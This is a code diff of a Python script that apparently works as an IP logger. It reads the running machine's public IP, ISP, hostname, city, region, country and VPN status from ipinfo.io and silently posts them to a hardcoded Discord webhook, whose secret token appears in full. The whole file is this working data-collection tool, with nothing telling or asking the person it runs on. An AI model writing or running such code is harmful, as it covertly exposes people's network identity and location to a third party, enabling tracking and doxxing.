@@ -1,7 +1,29 @@
 import requests
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1444092786210111632/x8hPF9-vXrKOy_3QJwZKDFvRCsm_7PzVuH69t_rqczttGBoWIXhlexfu9fvxMbrUeijn"
-IPINFO_TOKEN = ""  # Optional: put your ipinfo.io token here
+IPINFO_TOKEN = ""
+
+def get_ipinfo(ip):
+    url = f"https://ipinfo.io/{ip}"
+    if IPINFO_TOKEN:
+        url += f"?token={IPINFO_TOKEN}"
+    try:
+        resp = requests.get(url, timeout=10)
+        resp.raise_for_status()
+        return resp.json()
+    except Exception:
+        return None
+
+def get_ip_privacy(ip):
+    url = f"https://ipinfo.io/{ip}/privacy"
+    if IPINFO_TOKEN:
+        url += f"?token={IPINFO_TOKEN}"
+    try:
+        resp = requests.get(url, timeout=10)
+        resp.raise_for_status()
+        return resp.json()
+    except Exception:
+        return None
 
 def get_public_ip():
     try:
@@ -11,37 +33,32 @@ def get_public_ip():
     except requests.RequestException:
         return None
 
-def is_vpn_ip(ip):
-    # Compose the appropriate URL for the ipinfo VPN check
-    url = f"https://ipinfo.io/{ip}/privacy"
-    if IPINFO_TOKEN:
-        url += f"?token={IPINFO_TOKEN}"
+def send_ip_to_discord(message):
     try:
-        response = requests.get(url, timeout=10)
-        response.raise_for_status()
-        data = response.json()
-        # If ipinfo says 'vpn' is true, return True
-        return data.get("vpn", False)
-    except Exception:
-        # If API fails, assume not VPN
-        return False
-
-def send_ip_to_discord(ip):
-    data = {
-        "content": f"User's public IP address: {ip}"
-    }
-    try:
-        requests.post(WEBHOOK_URL, json=data)
+        requests.post(WEBHOOK_URL, json={"content": message})
     except requests.RequestException:
         pass
 
 def main():
     ip = get_public_ip()
-    if ip:
-        # Detect VPN status before sending
-        if is_vpn_ip(ip):
-            ip = f"{ip} (VPN)"
-        send_ip_to_discord(ip)
+    if not ip:
+        return
+    info = get_ipinfo(ip)
+    privacy = get_ip_privacy(ip)
+    org = info.get("org", "Unknown") if info else "Unknown"
+    city = info.get("city", "Unknown") if info else "Unknown"
+    region = info.get("region", "Unknown") if info else "Unknown"
+    country = info.get("country", "Unknown") if info else "Unknown"
+    hostname = info.get("hostname", "Unknown") if info else "Unknown"
+    vpn = privacy.get("vpn", False) if privacy else False
+    details = [
+        f"User's public IP address: {ip}{' (VPN)' if vpn else ''}",
+        f"ISP: {org}",
+        f"Hostname: {hostname}",
+        f"Location: {city}, {region}, {country}"
+    ]
+    message = "\n".join(details)
+    send_ip_to_discord(message)
 
 if __name__ == "__main__":
     main()
